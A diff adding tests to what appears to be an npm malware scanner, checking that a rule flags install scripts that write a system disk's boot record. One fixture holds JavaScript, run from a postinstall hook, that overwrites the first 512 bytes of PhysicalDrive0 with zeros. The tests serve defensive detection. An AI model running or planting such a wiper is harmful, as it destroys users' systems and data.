@@ -178,3 +178,37 @@ class TestFlowRawChannel:
             tmp_path, "demo-cfg", {"version": "1.0.0", "main": "index.js"}, {"index.js": code}
         )
         assert self.RULE not in Npm.findings(pkg)
+
+
+class TestSystemDiskWrite:
+    """A wiper writing the first disk's boot record (review 98 P4 #5). Inert: the byte buffers are
+    zeros and nothing here runs."""
+
+    RULE = "SUSPECT.DESTROY.SYSTEM_DISK.001"
+
+    def test_an_install_script_that_overwrites_the_first_disk(self, tmp_path) -> None:
+        code = (
+            "const fs = require('fs');\n"
+            "const fd = fs.openSync('\\\\\\\\.\\\\PhysicalDrive0', 'r+');\n"
+            "fs.writeSync(fd, Buffer.alloc(512), 0, 512, 0);\n"
+        )
+        pkg = Npm.build(
+            tmp_path,
+            "demo-disk",
+            {"version": "1.0.0", "scripts": {"postinstall": "node setup.js"}},
+            {"setup.js": code},
+        )
+        assert Npm.findings(pkg).get(self.RULE, Severity.INFO) >= Severity.HIGH
+
+    def test_an_imager_writing_the_device_the_user_chose(self, tmp_path) -> None:
+        code = (
+            "const fs = require('fs');\n"
+            "module.exports = (device, image) => {\n"
+            "  const fd = fs.openSync(device.path, 'r+');\n"
+            "  fs.writeSync(fd, fs.readFileSync(image));\n"
+            "};\n"
+        )
+        pkg = Npm.build(
+            tmp_path, "demo-imager", {"version": "1.0.0", "main": "index.js"}, {"index.js": code}
+        )
+        assert self.RULE not in Npm.findings(pkg)
